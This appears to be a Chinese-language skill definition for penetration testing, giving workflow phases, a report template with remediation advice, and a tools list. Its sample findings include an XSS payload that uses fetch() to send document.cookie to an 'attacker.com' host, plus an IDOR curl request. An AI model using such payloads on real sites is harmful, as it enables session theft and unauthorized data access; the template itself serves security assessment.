# 渗透测试技能

## 技能定义
模拟攻击者视角进行安全测试的能力，发现系统漏洞。

## 适用场景
- 安全评估
- 漏洞验证
- 合规要求
- 红队演练

## 执行流程

### 1. 侦察 (Reconnaissance)
- 信息收集
- 端口扫描
- 服务识别

### 2. 漏洞发现 (Discovery)
- 漏洞扫描
- 手工测试
- 配置检查

### 3. 利用 (Exploitation)
- 漏洞验证
- 权限提升
- 横向移动

### 4. 报告 (Reporting)
- 漏洞证明
- 风险评估
- 修复建议

## 输出格式
```markdown
## 渗透测试报告

### 测试信息
- 目标: [目标系统]
- 范围: [测试范围]
- 方法: 黑盒/灰盒/白盒
- 时间: [测试时间]
- 测试者: [测试人员]

### 执行摘要
- 发现漏洞: X个
- 严重: X | 高危: X | 中危: X | 低危: X
- 整体风险等级: 高/中/低

### 测试范围

#### 目标资产
| 资产 | 类型 | IP/URL |
|------|------|--------|
| 主站 | Web | example.com |
| API | REST | api.example.com |
| 管理后台 | Web | admin.example.com |

#### 测试方法
- [x] 端口扫描
- [x] 服务识别
- [x] 漏洞扫描
- [x] Web应用测试
- [x] 认证测试
- [x] 授权测试

### 发现详情

#### 漏洞1: 存储型XSS

**风险等级**: 高
**CVSS**: 7.5
**位置**: 用户评论功能

**描述**:
用户评论内容未经过滤直接渲染，允许注入恶意JavaScript代码。

**复现步骤**:
1. 登录系统
2. 进入评论页面
3. 提交评论: `<script>alert(document.cookie)</script>`
4. 刷新页面,观察弹窗

**PoC**:
```html
<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
```

**影响**:
- 窃取用户Cookie
- 会话劫持
- 钓鱼攻击

**修复建议**:
1. 输入验证: 过滤特殊字符
2. 输出编码: HTML实体编码
3. CSP策略: 限制脚本来源

---

#### 漏洞2: 越权访问

**风险等级**: 严重
**CVSS**: 9.1
**位置**: /api/users/{id}

**描述**:
API未验证用户是否有权访问请求的资源。

**复现步骤**:
1. 以用户A登录
2. 访问 `/api/users/B-user-id`
3. 成功获取用户B的数据

**PoC**:
```bash
curl -H "Authorization: Bearer <A's token>" \
  https://api.example.com/users/B-user-id
```

**修复建议**:
```typescript
// 添加权限检查
if (requestedUserId !== currentUser.id && !currentUser.isAdmin) {
  throw new ForbiddenError();
}
```

### 测试覆盖

| 测试项 | 状态 | 发现 |
|--------|------|------|
| 注入测试 | ✅ | 1个中危 |
| XSS测试 | ✅ | 1个高危 |
| 认证测试 | ✅ | 无 |
| 授权测试 | ✅ | 1个严重 |
| 会话管理 | ✅ | 无 |
| 文件上传 | ✅ | 无 |
| 信息泄露 | ✅ | 1个低危 |

### 修复建议优先级

| 优先级 | 漏洞 | 建议修复时间 |
|--------|------|--------------|
| P0 | 越权访问 | 立即 |
| P1 | XSS | 1周内 |
| P2 | SQL注入 | 2周内 |
| P3 | 信息泄露 | 1个月内 |
```

## 常用工具

| 类别 | 工具 |
|------|------|
| 信息收集 | nmap, shodan |
| Web扫描 | OWASP ZAP, Burp Suite |
| 漏洞利用 | Metasploit |
| 密码破解 | Hashcat, John |
| 流量分析 | Wireshark |
